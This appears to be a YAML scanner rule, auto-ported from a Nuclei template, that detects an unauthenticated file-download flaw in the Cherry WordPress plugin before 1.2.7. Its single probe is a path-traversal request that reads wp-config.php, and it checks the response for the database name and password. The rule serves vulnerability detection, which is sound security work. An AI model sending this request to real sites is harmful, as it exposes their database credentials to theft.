schema_version: 1
id: "cortex.community:cherry-file-download"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload"
  description: "WordPress plugin Cherry < 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee"
    - "https://github.com/CherryFramework/cherry-plugin"
  cwes: [23]
  tags: ["wordpress", "wp-plugin", "lfi", "wpscan", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
